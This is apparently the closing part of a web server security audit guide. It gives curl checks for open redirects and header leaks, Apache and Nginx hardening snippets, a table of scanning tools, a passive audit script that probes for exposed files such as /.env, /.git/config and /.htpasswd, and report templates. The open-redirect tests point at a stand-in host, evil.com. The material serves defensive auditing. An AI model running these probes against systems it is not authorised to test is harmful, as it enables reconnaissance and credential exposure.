```bash
# Check open redirect
curl -sI "https://target.com/redirect?url=https://evil.com"
curl -sI "https://target.com/out?link=//evil.com"

# Check if HTTP→HTTPS redirect exists
curl -sI "http://target.com/" | grep -i "location:"

# Check Expect-CT (deprecated — flag if present)
curl -sI https://target.com | grep -i "expect-ct"

# Check HPKP (deprecated — dangerous if misconfigured)
curl -sI https://target.com | grep -i "public-key-pins"

# Check for Etag leakage (inode exposure on Apache < 2.4)
curl -sI https://target.com | grep -i "etag:"

# Check for verbose error messages
curl "https://target.com/nonexistent-page-xyz"
```

**Etag inode fix — Apache:**
```apache
# Remove inode from ETag (prevents inode leakage in clustered environments)
FileETag MTime Size   # Exclude inode
```

**HTTP→HTTPS redirect — Nginx:**
```nginx
server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    return 301 https://$host$request_uri;
}
```

**HTTP→HTTPS redirect — Apache:**
```apache
<VirtualHost *:80>
    RewriteEngine On
    RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]
</VirtualHost>
```

---

## Toolchain reference

| Tool | Install | Best for |
|------|---------|---------|
| `testssl.sh` | `git clone https://github.com/drwetter/testssl.sh` | TLS deep audit — checks all protocols, ciphers, cert |
| `nikto` | `apt install nikto` | Server misconfiguration scan (requires auth for prod) |
| `whatweb` | `apt install whatweb` | Server/tech fingerprinting |
| `wafw00f` | `pip install wafw00f` | WAF detection |
| `nuclei` | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` | Template-based vuln scanning |
| `sslyze` | `pip install sslyze` | TLS configuration analysis |
| `nmap` | `apt install nmap` | Port/service enum + HTTP NSE scripts |
| `curl` | built-in | Header inspection, manual request crafting |
| `gobuster` | `apt install gobuster` | Directory/file brute force (requires auth) |

```bash
# Quick audit command bundle (passive — no aggressive scanning)
TARGET=https://target.com
echo "=== HEADERS ==="
curl -sI $TARGET | sort

echo "=== TLS ==="
testssl.sh --severity HIGH --quiet $TARGET

echo "=== FINGERPRINT ==="
whatweb -a 1 $TARGET

echo "=== SENSITIVE FILES ==="
for f in /.env /.git/config /.htpasswd /phpinfo.php /backup.zip; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$f")
  [ "$code" != "404" ] && [ "$code" != "403" ] && echo "EXPOSED [$code]: $f"
done
```

---

## Defect format

```
WSEC-DEFECT-N
Server:    [Apache | Nginx | OpenLiteSpeed | Any]
Category:  [Headers | TLS | Access Control | Disclosure | Traversal | DoS | Injection | ...]
Severity:  [Critical | High | Medium | Low | Info]
Check:     [Check number and name]
Finding:   [exact value, exact path, exact header, exact version]
Impact:    [what attacker can do]
Fix:       [exact config snippet — ready to paste]
```

---

## Report structure

```
## Web Server Security Report — [target] — [date]

Mode: [1/2/3]  Server: [detected type+version]  Checks run: [N/22]

### Critical findings (fix immediately)
### High findings (fix this sprint)
### Medium findings (fix this quarter)
### Low / Info findings (track)

### Fix plan
[Ordered by severity — config snippets for each finding]

### Verification commands
[curl/testssl commands to re-test each fix]
```
